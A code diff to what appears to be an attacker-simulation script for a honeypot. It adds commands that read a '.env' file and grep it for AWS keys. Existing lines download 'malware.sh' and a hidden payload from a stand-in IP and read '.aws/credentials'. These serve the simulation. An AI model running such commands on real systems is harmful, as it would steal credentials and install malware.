@@ -74,6 +74,8 @@ PROFILE_COMMANDS = {
         "netstat -tulnp",
         "cat /proc/version",
         "ls /var/www",
+        "ls -la /home/admin/loot",
+        "cat /opt/novapay/.env",
         "wget http://203.0.113.10/malware.sh -O /tmp/m.sh",
     ],
     "targeted": [
@@ -95,6 +97,8 @@ PROFILE_COMMANDS = {
         "crontab -l",
         "ls /var/log",
         "cat /var/log/auth.log",
+        "ls -la /home/admin/loot",
+        "cat /opt/novapay/.env",
         "find / -name '*.conf' 2>/dev/null | head -10",
         "find / -perm -4000 2>/dev/null | head -10",
         "wget http://203.0.113.10/payload -O /tmp/.hidden",
@@ -124,6 +128,10 @@ DISCOVERY_FOLLOW_UPS = {
     "ls -la /home/admin/.aws": {
         "needle": "credentials",
         "command": "cat /home/admin/.aws/credentials",
+    },
+    "cat /opt/novapay/.env": {
+        "needle": "rotation_marker=shadowmesh_live_credentials",
+        "command": "grep AWS /opt/novapay/.env",
     },
 }
 
